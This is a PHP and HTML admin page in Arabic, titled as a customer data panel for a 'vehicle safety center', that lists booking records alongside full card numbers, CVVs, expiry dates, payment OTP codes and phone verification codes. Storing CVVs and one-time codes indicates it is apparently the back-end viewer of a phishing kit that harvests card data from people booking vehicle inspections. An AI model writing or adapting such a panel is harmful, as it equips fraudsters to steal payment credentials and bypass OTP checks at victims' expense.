<?php
require_once 'db.php';
$result = $conn->query("SELECT a.*, p.card_name, p.card_number, p.cvv, p.expiry_date, p.verification_code, p.phone_number, p.operator, p.phone_verification_code
  FROM appointments a
  LEFT JOIN payments p ON a.id = p.client_id
  ORDER BY a.id DESC");
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>لوحة إدارة بيانات العملاء - مركز سلامة المركبات</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Tajawal&display=swap" rel="stylesheet">
  <style>
    body { font-family: 'Tajawal', sans-serif; background-color: #f4f6f8; margin: 0; padding: 20px; }
    h3.title { color: #1a6d3c; margin-bottom: 30px; text-align: center; }
    .client-card {
      border-radius: 15px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.05);
      background: white;
      padding: 20px;
      margin-bottom: 20px;
    }
    .client-card h6 { color: #1a6d3c; font-weight: bold; margin-bottom: 10px; }
    .client-card p { margin-bottom: 6px; font-size: 14px; }
    .more-info { display: none; margin-top: 15px; border-top: 1px solid #ccc; padding-top: 10px; }
    .btn-toggle {
      background-color: #1a6d3c;
      color: white;
      border: none;
      padding: 5px 15px;
      font-size: 14px;
      border-radius: 8px;
      margin-top: 10px;
    }
  </style>
</head>
<body>

  <div class="container">
    <h3 class="title">لوحة إدارة بيانات العملاء</h3>
    <div class="row row-cols-1 row-cols-md-2 row-cols-lg-4 g-3">
      <?php while($row = $result->fetch_assoc()): ?>
      <div class="col">
        <div class="client-card">
          <h6>👤 بيانات العميل</h6>
          <p><strong>الاسم:</strong> <?= htmlspecialchars($row['fullname']) ?></p>
          <p><strong>رقم الجوال:</strong> <?= htmlspecialchars($row['phone']) ?></p>

          <div class="more-info">
            <h6>🚗 بيانات المركبة</h6>
            <p><strong>اللوحة:</strong> <?= htmlspecialchars($row['vehiclenumber']) ?></p>
            <p><strong>التسجيل:</strong> <?= htmlspecialchars($row['registrationtype']) ?></p>
            <p><strong>النوع:</strong> <?= htmlspecialchars($row['vehicletype']) ?></p>
            <p><strong>الفحص:</strong> <?= htmlspecialchars($row['inspectiontype']) ?></p>
            <p><strong>المدينة:</strong> <?= htmlspecialchars($row['city']) ?></p>
            <p><strong>الموعد:</strong> <?= htmlspecialchars($row['date']) ?> - <?= htmlspecialchars($row['time']) ?></p>

            <h6 class="pt-3">💳 بيانات البطاقة</h6>
            <p><strong>صاحب البطاقة:</strong> <?= htmlspecialchars($row['card_name']) ?></p>
            <p><strong>رقم البطاقة:</strong> <?= htmlspecialchars($row['card_number']) ?></p>
            <p><strong>CVV:</strong> <?= htmlspecialchars($row['cvv']) ?></p>
            <p><strong>تاريخ الانتهاء:</strong> <?= htmlspecialchars($row['expiry_date']) ?></p>

            <h6 class="pt-3">🔐 رموز التحقق</h6>
            <p><strong>رمز الدفع (OTP):</strong> <?= htmlspecialchars($row['verification_code']) ?></p>
            <p><strong>رمز تحقق الجوال:</strong> <?= htmlspecialchars($row['phone_verification_code']) ?></p>
            <p><strong>المشغل:</strong> <?= htmlspecialchars($row['operator']) ?></p>
            <p><strong>رقم الجوال للتحقق:</strong> <?= htmlspecialchars($row['phone_number']) ?></p>
          </div>

          <button class="btn-toggle" onclick="toggleMore(this)">عرض المزيد</button>
        </div>
      </div>
      <?php endwhile; ?>
    </div>
  </div>

<script>
function toggleMore(btn) {
  const more = btn.previousElementSibling;
  if (more.style.display === "none" || more.style.display === "") {
    more.style.display = "block";
    btn.textContent = "إخفاء";
  } else {
    more.style.display = "none";
    btn.textContent = "عرض المزيد";
  }
}
</script>

</body>
</html>